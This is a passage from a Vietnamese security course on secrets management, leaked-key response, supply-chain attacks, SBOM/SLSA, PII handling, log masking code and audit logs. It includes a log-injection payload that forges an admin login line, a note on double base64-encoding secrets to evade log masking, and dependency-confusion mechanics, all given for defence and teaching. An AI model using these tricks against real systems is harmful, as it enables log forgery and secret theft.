*Secret manager* giải quyết những thứ file và env var không làm được:

- Phân quyền chi tiết theo từng secret, theo nguyên tắc *least privilege* (chỉ cấp đúng quyền cần):
  service thanh toán đọc được key cổng thanh toán, service email thì không. Kỹ sư cũng không cần đọc
  được mọi secret.
- Audit: ai (service nào) xin secret nào, lúc nào, được duyệt hay bị từ chối, có ai dùng secret đã
  hết hạn không.
- Rotation tự động. Ví dụ OWASP mô tả với AWS Secrets Manager: một Lambda xoay password DB theo bốn
  bước tạo secret mới, đặt vào DB, thử kết nối, rồi mới đánh dấu bản mới là bản hiện hành.
- *Dynamic secret*: không lưu password cố định mà sinh credential mới cho mỗi lần xin, có thời hạn,
  hết hạn tự thu hồi. Ví dụ Vault sinh một user DB riêng cho mỗi instance app lúc khởi động. Credential
  bị trộm thì hết giá trị khi hết hạn, và dùng từ IP khác với consumer là phát hiện được ngay.

*Rotation không downtime*: đổi secret mà không làm rớt request đang chạy, hệ thống phải chấp nhận cả
secret cũ và mới trong giai đoạn chuyển:

1. Tạo secret mới, bên phát hành chấp nhận cả hai (DB có hai user, hoặc API cho hai key cùng hiệu lực).
2. Cập nhật mọi consumer sang secret mới.
3. Kiểm tra không còn ai dùng secret cũ (nhìn log truy cập hoặc metric).
4. Thu hồi secret cũ.

Cùng mẫu với `APP_PREVIOUS_KEYS` của Laravel và key rotation ở module 3.3.

Tốt hơn nữa là không có secret dài hạn:

- *IAM role*: quyền gắn với danh tính trên cloud (một EC2 instance, một Lambda), SDK tự lấy
  credential tạm thời, không có access key nào nằm trong cấu hình.
- *Workload identity*: danh tính gắn với pod hoặc job; nền tảng tự cấp credential ngắn hạn. Ví dụ phổ
  biến: GitHub Actions dùng OIDC token của job để đổi lấy credential AWS tạm thời, thay vì lưu access
  key trong secret của CI.
- OWASP còn nhắc: CI/CD là nơi giữ nhiều secret quyền cao nhất, phải được bảo vệ như production; bất
  kỳ ai sửa được pipeline đều có thể in secret ra (kể cả mã hoá base64 hai lần để qua mặt bộ che log).

#### Khi secret lỡ bị commit

⚠️ Secret đã lên repo public thì coi như **đã lộ**, dù chỉ trong vài giây và dù đã xoá commit ngay.
Bot quét GitHub public liên tục, key cloud có thể bị dùng để chạy máy đào coin trong thời gian rất
ngắn. GitHub cũng hợp tác với nhiều nhà cung cấp (secret scanning partner program): phát hiện key của
partner trên repo public thì báo thẳng cho nhà cung cấp để họ xử lý, có thể là thu hồi key.

Thứ tự xử lý (OWASP: revocation, rotation, deletion, logging):

1. **Vô hiệu hoá key cũ và cấp key mới.** Với repo public, tốc độ quan trọng hơn uptime: chấp nhận vài
   phút lỗi còn hơn để key sống. Có sẵn quy trình rotation tự động thì bước này nhanh.
2. **Điều tra key đã bị dùng chưa, dùng vào việc gì.** Với AWS: xem CloudTrail theo access key ID, tìm
   IAM user, role, access key **mới** do kẻ tấn công tạo (để giữ quyền sau khi key gốc bị khoá), máy
   ảo lạ ở mọi region, bucket bị đọc. Kẻ tấn công đã tạo credential mới thì thu hồi key gốc chưa đủ.
3. **Rồi mới dọn lịch sử git**, nếu cần. GitHub nói thẳng: dọn lịch sử tốn công và thường không cần
   thiết nếu credential đã bị thu hồi.

Vì sao dọn lịch sử trước là sai thứ tự: trong lúc bạn loay hoay viết lại lịch sử, key vẫn còn hiệu
lực; và kể cả dọn xong, key có thể đã bị sao chép, còn trong các bản clone, fork, cache. Viết lại
lịch sử còn làm hỏng mọi link tới commit cũ (OWASP lưu ý điều này).

```sh
# Minh hoạ với AWS CLI (thay giá trị thật). Bước 1: khoá key bị lộ
aws iam update-access-key --user-name deploy-bot --access-key-id AKIAEXAMPLE --status Inactive
aws iam create-access-key --user-name deploy-bot       # hoặc tốt hơn: chuyển hẳn sang IAM role

# Bước 2: key này đã làm gì (lookup-events chỉ xem management event trong 90 ngày, theo từng region)
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=AccessKeyId,AttributeValue=AKIAEXAMPLE

# Bước 3 (sau cùng): xoá file khỏi toàn bộ lịch sử bằng git-filter-repo, rồi force push
git filter-repo --invert-paths --path .env
```

Phòng ngừa, nhiều lớp:

- *Pre-commit hook* quét secret trên máy dev trước khi commit. Ví dụ gitleaks tích hợp với framework
  `pre-commit` qua file `.pre-commit-config.yaml`. Cách này bỏ qua được (gitleaks cho phép
  `SKIP=gitleaks git commit ...`), nên chỉ là lớp đầu.
- *Secret scanning trong CI*: `gitleaks git` quét lịch sử (dùng `git log -p` bên dưới), `gitleaks dir`
  quét thư mục; mặc định thoát với exit code 1 khi thấy leak, nên làm CI fail được.
- *GitHub secret scanning*: quét toàn bộ lịch sử git trên mọi nhánh (và cả nội dung issue), tạo alert,
  và quét lại khi có loại secret mới. Miễn phí cho repo public; repo private của organization cần
  gói GitHub Secret Protection.
- *GitHub push protection*: chặn **ngay lúc push** nếu phát hiện secret, thay vì báo sau. Người có
  quyền ghi vẫn bypass được bằng cách ghi lý do; mọi lần bypass tạo alert và email cho người quản lý.
- `.gitignore` có `.env` từ ngày đầu, và key test dùng giá trị chuẩn chung cho cả tổ chức để giảm
  báo nhầm (OWASP).

#### Supply chain (A03:2025)

*Software supply chain* (chuỗi cung ứng phần mềm) là mọi thứ bạn không tự viết nhưng tham gia tạo ra
hoặc chạy trong sản phẩm: package Composer/npm (kể cả dependency gián tiếp), base image, runtime, công
cụ build, CI/CD, IDE và extension của IDE. OWASP Top 10:2025 đặt nó ở mục **A03 Software Supply Chain
Failures**, mở rộng từ "A9: Using Components with Known Vulnerabilities" năm 2013: không chỉ lỗ hổng
đã biết mà mọi sự cố trong quá trình build, phân phối, cập nhật phần mềm. Trong khảo sát cộng đồng
của bản 2025, đúng 50% người trả lời xếp nó hạng nhất.

Vì sao nguy hiểm: package chạy với **cùng quyền** với app. Một package log bị chèn mã độc đọc được
`APP_KEY`, kết nối DB, mọi request.

Lớp 1, lỗ hổng đã biết:

- `composer audit`, `npm audit`, `govulncheck` (Go; chỉ báo lỗ hổng nằm trong code thật sự được gọi
  tới, nên ít báo nhầm). Chạy trong CI, fail build khi có lỗ hổng nghiêm trọng.
- Dependabot hoặc Renovate tự mở PR nâng version khi có bản vá.
- OWASP còn nhắc: vá theo mức rủi ro và kịp thời; quy trình "vá mỗi quý một lần" để hệ thống hở hàng
  tháng. Và phải theo dõi cả package **không còn được bảo trì**.

Lớp 2, build tái lập được: commit `composer.lock` (và `package-lock.json`), production chỉ chạy
`composer install`, để lần build nào cũng ra đúng một bộ version đã review. Chi tiết lock, semver và
`composer audit` ở [05-php-laravel.md#15-composer-và-psr](05-php-laravel.md#15-composer-và-psr).
OWASP bổ sung: chủ động chọn version và chỉ nâng khi cần; không deploy bản cập nhật cho mọi hệ thống
cùng lúc mà rollout dần (canary) để giới hạn thiệt hại nếu chính nhà cung cấp tin cậy bị chiếm.

⚠️ Các kiểu tấn công cần kể được:

| Kiểu | Cơ chế | Chặn |
|---|---|---|
| *Typosquatting* | Đăng package tên gần giống package thật (`larvel/framework`), chờ người gõ nhầm | Review mọi dependency mới trong PR; nhìn số lượt tải, người bảo trì |
| *Dependency confusion* | Công ty có package nội bộ `acme/utils` ở registry riêng; kẻ tấn công đăng `acme/utils` bản `2.999` lên registry public; trình cài đặt thấy bản public version cao hơn nên lấy nhầm | Registry nội bộ là *canonical*, lọc package theo repository, giữ tên namespace trên registry public |
| Chiếm tài khoản maintainer | Đẩy version mới có mã độc của một package thật, phổ biến | Lock version, rollout dần, ưu tiên package được ký, đọc changelog trước khi nâng |
| Chèn mã qua pipeline build | Kẻ tấn công vào được CI hoặc máy build, artifact phát hành khác với source (kiểu SolarWinds 2019) | Ký artifact, provenance (SLSA), CI được bảo vệ như production |
| Script lúc cài đặt | Package chạy code khi cài (npm `postinstall`, plugin Composer) | npm `--ignore-scripts` khi có thể; Composer 2.2+ bắt khai báo `allow-plugins` |

OWASP kể lại các vụ thật: SolarWinds (2019, khoảng 18.000 tổ chức bị ảnh hưởng qua bản cập nhật của
nhà cung cấp); vụ trộm 1,5 tỉ USD của Bybit năm 2025 qua phần mềm ví chỉ kích hoạt khi đúng ví mục
tiêu được dùng; sâu npm Shai-Hulud năm 2025, dùng script post-install để lấy dữ liệu nhạy cảm, tự tìm
npm token trên máy nạn nhân để đẩy bản độc vào mọi package mà token đó có quyền, lan tới hơn 500
version package. Bài học của vụ cuối: **máy của lập trình viên** giờ là mục tiêu chính.

Dependency confusion với Composer, cụ thể:

- Composer 2.x mặc định coi **mọi repository là canonical**: tìm package theo thứ tự repository khai
  báo, repository nào có package đó thì chỉ lấy từ đó, không xét repository sau. Tài liệu Composer
  dùng đúng ví dụ này: nếu repository riêng không canonical, ai đó đăng `foo/bar 2.999` lên
  packagist.org thì Composer sẽ chọn nó vì version cao hơn bản 2.4.3 nội bộ. Composer 1.x thì ngược
  lại, coi mọi repository là không canonical.
- packagist.org luôn được thêm ngầm vào **cuối** danh sách. Vì vậy phải khai báo repository nội bộ
  (Satis, Private Packagist, GitLab package registry...) trong `composer.json` và **đừng** đặt
  `"canonical": false` cho nó.
- Lọc thêm bằng `only` / `exclude` để repository nào chỉ được cung cấp đúng package của nó.
- Muốn chặn hẳn, tắt packagist.org (`{"packagist.org": false}`) và mirror mọi package qua registry
  nội bộ.
- Packagist bảo vệ *vendor name*: khi đã có package đăng dưới một vendor, người khác không đăng được
  package mới dưới vendor đó nếu không là maintainer của ít nhất một package thuộc vendor. Nghĩa là
  nếu `acme/` chưa từng được đăng lên Packagist thì kẻ khác có thể chiếm tên đó trước bạn.

```json
{
    "repositories": [
        {
            "type": "composer",
            "url": "https://packages.acme.internal",
            "only": ["acme/*"]
        }
    ],
    "config": {
        "allow-plugins": {
            "acme/installer-plugin": true
        }
    }
}
```

Với npm, cách tương ứng là dùng *scope* (`@acme/utils`) và cấu hình scope đó trỏ về registry nội bộ.

#### SBOM, ký artifact và SLSA

*SBOM* (Software Bill of Materials, "bảng thành phần" của phần mềm): danh sách mọi thành phần và
version có trong sản phẩm, gồm cả dependency gián tiếp và package hệ điều hành trong image. Hai định
dạng chuẩn:

- *SPDX*: do Linux Foundation phát triển, là chuẩn ISO/IEC 5962:2021.
- *CycloneDX*: do OWASP phát triển, đã thành chuẩn Ecma (ECMA-424). Ngoài SBOM còn mô tả được phần
  cứng (HBOM), dịch vụ, và thông tin license.

OWASP A03 đặt việc "tạo và quản lý SBOM tập trung cho toàn bộ phần mềm" là biện pháp đầu tiên, kèm
theo dõi liên tục CVE, NVD, OSV bằng các công cụ như OWASP Dependency-Track (nạp SBOM của mọi service,
tự đối chiếu với cơ sở dữ liệu lỗ hổng).

SBOM giúp gì trong 24 giờ đầu sau khi một CVE lớn được công bố (kiểu Log4Shell, CVE-2021-44228):

1. Giờ đầu: tra kho SBOM "service nào đang chạy thư viện X, version nào", ra danh sách trong vài
   phút, kể cả nơi X chỉ là dependency gián tiếp hoặc nằm trong base image. Không có SBOM thì phải
   hỏi từng team, grep từng repo, và luôn sót chỗ.
2. Xếp ưu tiên: service public ra internet, xử lý input của người dùng vá trước.
3. Vá hoặc giảm thiểu (tắt tính năng, luật WAF làm *virtual patch*), build lại, deploy.
4. SBOM mới sinh từ bản build mới xác nhận thư viện đã được nâng ở mọi nơi.
5. Trả lời được khách hàng, đối tác, cơ quan quản lý "chúng tôi có bị ảnh hưởng không" bằng dữ liệu.

Ký artifact: SBOM cho biết "trong này có gì", còn chữ ký cho biết "cái này đúng là do pipeline của
mình build và không bị sửa sau đó". *Sigstore* là dự án mã nguồn mở để ký và verify artifact (image,
binary, SBOM) mà không phải tự quản lý private key dài hạn (*keyless signing*):

1. Công cụ `cosign` sinh một cặp key tạm thời.
2. Gửi kèm OIDC token chứng minh danh tính (email, service account, hoặc workflow CI) tới *Fulcio*, CA
   của Sigstore; Fulcio cấp certificate ngắn hạn gắn public key với danh tính đó.
3. Ký artifact rồi bỏ private key. Private key không bao giờ rời máy ký.
4. Sự kiện ký được ghi vào *Rekor*, log minh bạch chỉ ghi thêm (append-only), ai cũng kiểm tra được.
5. Khi verify: kiểm tra chữ ký, chuỗi certificate tới root của Sigstore, danh tính mong đợi (ví dụ
   "workflow release của repo acme/api"), và bằng chứng có trong Rekor.

Trong cluster, có thể bắt buộc chỉ chạy image có chữ ký hợp lệ từ pipeline của mình (admission
policy), nên image do ai đó push tay lên registry sẽ bị từ chối.

*SLSA* (Supply-chain Levels for Software Artifacts, đọc là "salsa") là khung các mức đảm bảo cho quá
trình tạo ra artifact. Tài liệu SLSA ví von: SBOM là nhãn thành phần trên hộp thực phẩm, SLSA là bộ
quy chuẩn an toàn của nhà máy làm cho nhãn đó đáng tin. Khái niệm trung tâm là *provenance*: bằng
chứng mô tả ai đã build artifact, bằng quy trình nào, từ đầu vào nào. Bản hiện hành (v1.2) có hai
*track*: Build và Source (Source track được thêm vào ở v1.2). Build track:

| Mức | Yêu cầu | Chống được |
|---|---|---|
| Build L0 | Không có | Không có gì |
| Build L1 | Có provenance mô tả cách build | Sai sót trong quy trình release; provenance dễ giả |
| Build L2 | Provenance được **ký** bởi một nền tảng build được host | Sửa artifact **sau** khi build |
| Build L3 | Nền tảng build được gia cố: các lần build cô lập nhau, bước build do người dùng định nghĩa không chạm được key ký provenance | Sửa **trong lúc** build, kể cả từ người trong nội bộ hay credential bị lộ |

Ở mức phỏng vấn, cần nói được: SBOM trả lời "có gì bên trong", chữ ký và provenance trả lời "từ đâu ra
và có bị sửa không", SLSA là thang đo mức tin cậy của quy trình build.

Base image và container: dùng image tối giản (ít package thì ít CVE và ít công cụ cho kẻ tấn công),
quét image bằng Trivy trong CI, sinh SBOM từ image. OWASP A03 thêm: *promote* cùng một artifact qua
các môi trường thay vì build lại cho từng môi trường, và build phải bất biến. Chi tiết ở
[19-devops-cloud.md](../19-devops-cloud.md).

**Tóm tắt nhanh**
- Secret không hard-code, không commit; env var chỉ là mức tối thiểu vì lộ qua `phpinfo()`,
  `/proc/<pid>/environ`, trang debug. Tốt hơn là secret manager (quyền theo service, audit, rotation),
  tốt nhất là không có secret dài hạn (IAM role, workload identity, dynamic secret).
- Rotation không downtime: chấp nhận cả cũ và mới trong giai đoạn chuyển, rồi mới thu hồi cũ.
- Lộ key lên repo public: thu hồi và thay key, điều tra log (kể cả credential mới do kẻ tấn công tạo),
  sau cùng mới dọn lịch sử git. Phòng bằng pre-commit hook, gitleaks trong CI, GitHub push protection.
- Supply chain là A03:2025. Kể được typosquatting, dependency confusion, chiếm tài khoản maintainer,
  chèn mã qua CI, script lúc cài.
- Composer 2 coi repository là canonical theo mặc định, packagist.org luôn đứng cuối; khai báo
  repository nội bộ và lọc bằng `only` để chặn dependency confusion.
- SBOM (SPDX, CycloneDX) cho biết ngay mình có bị CVE mới ảnh hưởng không; Sigstore ký artifact;
  SLSA Build L1 đến L3 đo độ tin cậy của provenance.

**Nguồn**: [OWASP Secrets Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html) ·
[OWASP Top 10:2025 A03 Software Supply Chain Failures](https://owasp.org/Top10/2025/A03_2025-Software_Supply_Chain_Failures/) ·
[SLSA v1.2: About](https://slsa.dev/spec/v1.2/about), [Build Track Basics](https://slsa.dev/spec/v1.2/build-track-basics) ·
[CycloneDX](https://cyclonedx.org/) · [Sigstore overview](https://docs.sigstore.dev/about/overview/) ·
[gitleaks](https://github.com/gitleaks/gitleaks) ·
[GitHub: About secret scanning](https://docs.github.com/en/code-security/secret-scanning/introduction/about-secret-scanning),
[About push protection](https://docs.github.com/en/code-security/secret-scanning/introduction/about-push-protection) ·
[Composer: Repository priorities](https://getcomposer.org/doc/articles/repository-priorities.md) ·
[Packagist: About](https://packagist.org/about) ·
[Laravel 13: Encrypting Environment Files](https://laravel.com/docs/configuration#encrypting-environment-files)


---

### 3.5 Dữ liệu cá nhân và pháp lý

Module này trả lời: dữ liệu cá nhân của một user thực sự nằm ở những đâu trong hệ thống (thường
nhiều hơn bạn nghĩ), làm sao để log không lộ nó, xoá "hết" nghĩa là gì khi có backup, và luật nào
đang áp dụng cho một công ty Việt Nam.

#### PII và phân loại

*PII* (Personally Identifiable Information) là dữ liệu xác định được, hoặc giúp xác định được, một
con người cụ thể. Điểm hay bị bỏ sót là chữ "giúp xác định": một địa chỉ IP, một device ID hay một
tổ hợp (ngày sinh + quận + giới tính) không nêu tên ai nhưng ghép lại vẫn chỉ ra được một người.

Luật Bảo vệ dữ liệu cá nhân của Việt Nam (xem nhóm cuối) chia làm hai loại, và giao cho Chính phủ ban
hành danh mục cụ thể:

| Loại | Ý nghĩa theo luật | Ví dụ thường gặp |
|---|---|---|
| Dữ liệu cá nhân cơ bản | Phản ánh nhân thân, lai lịch, dùng thường xuyên trong giao dịch | Họ tên, ngày sinh, giới tính, địa chỉ, hình ảnh cá nhân, SĐT, số định danh cá nhân, số hộ chiếu |
| Dữ liệu cá nhân nhạy cảm | Gắn với quyền riêng tư, bị xâm phạm thì ảnh hưởng trực tiếp tới quyền lợi | Sức khoẻ, sinh trắc học, vị trí xác định qua dịch vụ định vị, thông tin thẻ và tài khoản ngân hàng, ảnh thẻ căn cước, dữ liệu theo dõi hành vi sử dụng dịch vụ trên mạng |

Danh mục chính xác nằm ở Điều 3 (cơ bản) và Điều 4 (nhạy cảm) Nghị định 356/2025/NĐ-CP, đừng tự
suy. Vài điểm dễ bất ngờ: số định danh cá nhân là dữ liệu cơ bản nhưng ảnh chụp thẻ căn cước là
nhạy cảm; dữ liệu theo dõi hành vi, hoạt động sử dụng mạng xã hội, dịch vụ trực tuyến cũng là nhạy
cảm, tức là chạm thẳng vào analytics và tracking. Email không được nêu tên riêng, nó rơi vào mục
"thông tin khác gắn liền với một con người cụ thể" của danh mục cơ bản. Nghị định cũng yêu cầu khi
xử lý dữ liệu nhạy cảm phải có quy định phân quyền giới hạn truy cập, quy trình xử lý và biện pháp
bảo mật. Với kỹ sư, hệ quả thực tế là: dữ liệu nhạy cảm cần kiểm soát chặt hơn (mã hoá, quyền truy
cập hẹp hơn, ghi audit mọi lần đọc).

Ba khái niệm hay bị nhầm, và nhầm là sai về pháp lý:

- *Khử nhận dạng* (anonymization): biến đổi để không thể xác định lại con người. Theo luật Việt Nam,
  dữ liệu đã khử nhận dạng không còn là dữ liệu cá nhân.
- *Mã hoá*: dữ liệu mã hoá vẫn là dữ liệu cá nhân (luật ghi rõ điều này), vì ai có key vẫn đọc được.
- *Pseudonymization* (giả danh hoá): thay định danh bằng mã, ví dụ thay email bằng `user_1234`
  hoặc bằng hash của email. GDPR coi đây vẫn là dữ liệu cá nhân, vì ai giữ bảng ánh xạ vẫn nối lại
  được.

⚠️ `sha256(email)` không phải ẩn danh. Không gian email nhỏ và đoán được, kẻ tấn công hash sẵn danh
sách email bị lộ rồi so khớp. Muốn một định danh ổn định mà không đảo ngược được bằng từ điển, dùng
HMAC với key bí mật (key nằm trong KMS), và vẫn xếp nó vào loại pseudonymous.

*Data minimization* (tối thiểu hoá dữ liệu): chỉ thu thập và giữ những gì thật sự cần cho mục đích đã
nêu. Đây là biện pháp bảo mật rẻ nhất: dữ liệu không thu thì không thể lộ, không phải xoá, không phải
giải trình. Câu hỏi nên đặt khi review một form đăng ký: "cần ngày sinh đầy đủ, hay chỉ cần biết
trên 18 tuổi?".

Phân loại dữ liệu theo mức (data classification) để mỗi mức có quy tắc riêng. Bốn mức phổ biến trong
doanh nghiệp (tên có thể khác tuỳ công ty):

| Mức | Ví dụ | Quy tắc điển hình |
|---|---|---|
| Public | Trang giới thiệu sản phẩm | Không hạn chế |
| Internal | Tài liệu nội bộ, số liệu vận hành | Chỉ nhân viên |
| Confidential | Email, SĐT, lịch sử đơn hàng của khách | Theo vai trò, mã hoá khi truyền, che trong log |
| Restricted | Số thẻ, dữ liệu sức khoẻ, secret | Mã hoá khi lưu, rất ít người truy cập, audit từng lần đọc |

Phân loại chỉ có ích khi nó được gắn vào schema (ví dụ comment cột, hoặc một file khai báo cột nào
thuộc mức nào) để công cụ masking, export, xoá dữ liệu đọc được, thay vì nằm trong một file Word.

#### Masking trong log

OWASP Logging Cheat Sheet (mục "Data to exclude") liệt kê những thứ thường không được ghi thẳng vào
log, mà phải bỏ đi, che, hash hoặc mã hoá trước: source code, session ID (cần theo dõi theo session
thì thay bằng hash), access token, password, connection string, key mã hoá và secret chính, dữ liệu
tài khoản ngân hàng và chủ thẻ, dữ liệu cá nhân nhạy cảm (sức khoẻ, số định danh do nhà nước cấp),
dữ liệu người dùng đã từ chối hoặc chưa đồng ý cho thu thập. Một nhóm khác có ích khi điều tra nhưng
có thể cần xử lý riêng (xoá, xáo trộn, giả danh hoá) trước khi ghi: đường dẫn file, tên và địa chỉ
mạng nội bộ, dữ liệu cá nhân không nhạy cảm như tên, SĐT, email. Cheat sheet cũng nhắc: không log dữ
liệu mà luật không cho phép thu thập.

Trong một app Laravel, danh sách "cấm" cụ thể thường là: `password`, `password_confirmation`, token
(access, refresh, reset password), OTP, số thẻ và CVV, header `Authorization`, header `Cookie` và
`Set-Cookie`. Email, SĐT thì che bớt, ví dụ `ng***@gmail.com`.

Vì sao làm ở tầng logger chứ không trông vào từng dev: chỉ cần một dòng
`Log::info('login', $request->all())` là password vào log. Code review không bắt được hết. Một
*processor* của Monolog (thư viện log Laravel dùng bên dưới) chạy cho mọi bản ghi trước khi ghi ra
handler, nên là điểm chặn tập trung.

```php
<?php
declare(strict_types=1);

namespace App\Logging;

use Monolog\LogRecord;
use Monolog\Processor\ProcessorInterface;

// Processor chạy với MỌI bản ghi log trước khi tới handler (file, stderr, Slack...).
final class MaskSensitiveProcessor implements ProcessorInterface
{
    // Key bị thay hẳn bằng [REDACTED], so sánh không phân biệt hoa thường.
    private const DROP = [
        'password', 'password_confirmation', 'token', 'access_token', 'refresh_token',
        'otp', 'card_number', 'cvv', 'authorization', 'cookie', 'set-cookie',
    ];
    // Key được giữ một phần để còn tra cứu được.
    private const PARTIAL = ['email', 'phone'];

    public function __invoke(LogRecord $record): LogRecord
    {
        // Trong Monolog 3, context của LogRecord là readonly: with() trả về bản sao đã sửa.
        return $record->with(
            context: $this->clean($record->context),
            extra: $this->clean($record->extra),
        );
    }

    /** @param array<array-key, mixed> $data @return array<array-key, mixed> */
    private function clean(array $data): array
    {
        foreach ($data as $key => $value) {
            $k = is_string($key) ? strtolower($key) : '';
            if (in_array($k, self::DROP, true)) {
                $data[$key] = '[REDACTED]';
            } elseif (in_array($k, self::PARTIAL, true) && is_string($value)) {
                $data[$key] = $k === 'email' ? self::maskEmail($value) : self::maskTail($value);
            } elseif (is_array($value)) {
                $data[$key] = $this->clean($value); // đi sâu vào mảng lồng, ví dụ headers
            }
        }
        return $data;
    }

    public static function maskEmail(string $email): string
    {
        $at = strpos($email, '@');
        if ($at === false) {
            return self::maskTail($email);
        }
        // "nguyen@gmail.com" -> "ng***@gmail.com"
        return substr($email, 0, min(2, $at)) . '***' . substr($email, $at);
    }

    public static function maskTail(string $s): string
    {
        // "0912345678" -> "*******678": chỉ giữ 3 ký tự cuối
        $keep = 3;
        return strlen($s) <= $keep ? '***' : str_repeat('*', strlen($s) - $keep) . substr($s, -$keep);
    }
}
```

Gắn vào channel bằng cơ chế `tap` của Laravel: lớp tap nhận `Illuminate\Log\Logger`, lớp này chuyển
tiếp mọi lời gọi xuống Monolog, nên gọi được `pushProcessor`.

```php
<?php
declare(strict_types=1);

namespace App\Logging;

use Illuminate\Log\Logger;

final class AttachMasking
{
    public function __invoke(Logger $logger): void
    {
        $logger->pushProcessor(new MaskSensitiveProcessor());
    }
}

// config/logging.php, thêm 'tap' vào MỌI channel thực sự ghi (single, daily, stderr...):
// 'daily' => ['driver' => 'daily', 'tap' => [App\Logging\AttachMasking::class], ...],
// Channel dùng driver 'monolog' còn có thể khai báo trực tiếp qua key 'processors'.
```

Chứng minh bằng log thật (tiêu chí "Nắm chắc khi"): chạy
`php artisan tinker --execute="Log::info('login', ['email' => 'nguyen@gmail.com', 'password' => 'secret', 'headers' => ['authorization' => ['Bearer abc']]]);"`
rồi mở `storage/logs/`. Dòng log mong đợi có dạng (output minh hoạ, không phải chạy thật):

```
[2026-09-27 10:00:00] local.INFO: login {"email":"ng***@gmail.com","password":"[REDACTED]","headers":{"authorization":"[REDACTED]"}}
```

⚠️ Giới hạn của processor theo key, cần biết để không tự tin quá mức:

- Nó không đọc chuỗi `message`. `Log::info("Login thất bại cho $email")` vẫn lộ email. Quy ước team:
  dữ liệu biến đổi luôn đi vào context, không nội suy vào message.
- Nó không đi vào object. Nếu ai đó log cả object `Request` hay model `User`, formatter sẽ serialize
  theo cách riêng. Quy ước: chỉ log mảng scalar đã chọn lọc.
- Stack trace của exception có thể chứa tham số hàm. PHP 8.2+ có attribute `#[\SensitiveParameter]`
  để giá trị tham số không hiện trong stack trace:
  `function login(string $email, #[\SensitiveParameter] string $password)`.
- Laravel có facade `Context` với dữ liệu "hidden" (`Context::addHidden(...)`): dữ liệu vẫn truyền
  theo request và job nhưng không được ghi kèm vào log.
- Đừng quên log của tầng khác: access log của nginx ghi query string (token trong URL lọt ở đây),
  log của load balancer, APM, error tracker như Sentry (có cấu hình scrub dữ liệu riêng, cần kiểm tra đã bật và đủ field).

Log injection: kẻ tấn công nhét ký tự xuống dòng (CR, LF) vào input để giả một dòng log mới, ví dụ
username là `bob\n[...] INFO: admin login ok`. OWASP khuyên loại bỏ CR, LF và ký tự phân cách trước
khi ghi. Log dạng JSON (mỗi bản ghi một object, chuỗi được escape) giảm hẳn rủi ro này so với log dạng
text tự nối chuỗi.

Các nơi PII hay lọt ngoài DB chính, và cách chặn:

| Nơi | Vì sao lọt | Biện pháp |
|---|---|---|
| Log ứng dụng, access log | Dev log cả request; token trên URL | Processor như trên; không đặt token trên URL |
| Backup | Là bản sao nguyên vẹn của DB | Mã hoá backup, giới hạn người restore, vòng đời hết hạn |
| Data warehouse, BI | ETL copy cả bảng users để "sau này cần" | Chỉ đẩy cột cần, giả danh hoá ID |
| Staging, máy dev | Copy dump production cho "dữ liệu thật" | Ẩn danh hoá trong pipeline dump, trước khi rời production |
| Queue, cache | Payload job chứa cả object user | Payload chỉ chứa ID, job tự load lại |
| Bên thứ ba | Gửi email, SMS, analytics, hỗ trợ khách hàng | Hợp đồng xử lý dữ liệu, gửi tối thiểu |

Ẩn danh hoá khi tạo staging nên làm ở bước dump, để dữ liệu thật không bao giờ chạm vào môi trường
kém bảo vệ. Ví dụ phần biến đổi (chạy trên bản sao tạm trong vùng production, không bao giờ trên DB
production thật):

```sql
UPDATE users
SET name  = CONCAT('User ', id),
    email = CONCAT('user', id, '@example.test'),
    phone = NULL,
    date_of_birth = NULL;
-- Password hash cũng nên đặt lại một giá trị chung, để không ai thử bẻ hash thật trên staging.
```

⚠️ Ẩn danh hoá từng cột chưa chắc đủ: ghi chú tự do trong đơn hàng, địa chỉ giao hàng, nội dung
ticket hỗ trợ vẫn chứa tên và SĐT. Phải rà cả các cột text tự do.

#### Quyền truy cập và audit log

Nguyên tắc là "cần biết thì mới thấy" (need-to-know). Vài biện pháp cụ thể:

- Màn hình admin cho support chỉ hiện các trường cần cho công việc, SĐT hiện dạng che, bấm "xem đầy
  đủ" thì phải ghi lý do và bị ghi audit.
- Truy cập DB production đi qua *bastion* (máy trung gian duy nhất được phép vào mạng DB), có phê
  duyệt theo ca, mỗi người một tài khoản riêng. Không dùng chung một tài khoản `root`, vì như thế
  audit không biết ai đã làm gì.
- User DB cho người đọc (analyst, support nâng cao) chỉ có quyền `SELECT` trên view đã che cột:

```sql
CREATE VIEW support_users AS
  SELECT id, name, CONCAT(LEFT(email, 2), '***', SUBSTRING(email, LOCATE('@', email))) AS email_masked,
         created_at
  FROM users;
CREATE USER 'support_ro'@'10.0.%' IDENTIFIED BY '...';
GRANT SELECT ON shop.support_users TO 'support_ro'@'10.0.%';   -- không có quyền trên bảng users
```

*Audit log* là nhật ký hành động phục vụ truy vết: ai (user ID, vai trò, tài khoản dịch vụ), làm gì
(hành động), trên đối tượng nào (loại và ID), lúc nào (thời gian đã đồng bộ giờ), từ đâu (IP, user
agent, request ID), kết quả, và giá trị trước và sau khi sửa. Nó khác log ứng dụng: log ứng dụng để
debug, được phép lấy mẫu và xoá sớm; audit log là bằng chứng, phải đầy đủ và giữ lâu theo chính sách.

Để audit log có giá trị bằng chứng:

1. Append-only: chỉ ghi thêm. Ở mức DB, user của app chỉ được `INSERT` và `SELECT` trên bảng audit:
   `GRANT INSERT, SELECT ON shop.audit_logs TO 'app'@'10.0.%';` (không có `UPDATE`, `DELETE`).
2. Tách quyền: người vận hành hệ thống chính không có quyền xoá audit. Thường đẩy bản sao sang kho
   riêng, ví dụ object storage có chế độ khoá không cho xoá trong thời hạn giữ (như S3 Object Lock).
3. Chống sửa lén (tamper-evident): mỗi bản ghi lưu hash của bản ghi trước, sửa một dòng ở giữa là
   chuỗi hash gãy. OWASP Logging Cheat Sheet cũng khuyên có cơ chế phát hiện sửa xoá log.
4. Bản thân audit log chứa PII (IP, giá trị trước và sau của email...), nên được phân loại và bảo vệ
   như dữ liệu chính. Với trường nhạy cảm, lưu "đã đổi" thay vì giá trị thật.

#### Xoá dữ liệu

"Xoá tài khoản của tôi" là yêu cầu khó nhất về kỹ thuật, vì dữ liệu của một user nằm rải rác. Bước
đầu tiên luôn là có *data inventory* (bản đồ dữ liệu): danh sách mọi nơi lưu, kèm cách xoá ở từng
nơi. Ví dụ cho một app Laravel điển hình:

| Nơi | Cách xoá |
|---|---|
| MySQL chính (users, orders, addresses...) | Xoá hoặc ẩn danh hoá theo từng bảng, trong transaction |
| Cache (Redis) | Xoá key theo user; hoặc TTL ngắn để tự hết |
| Search index (Elasticsearch, Meilisearch) | Xoá document theo ID |
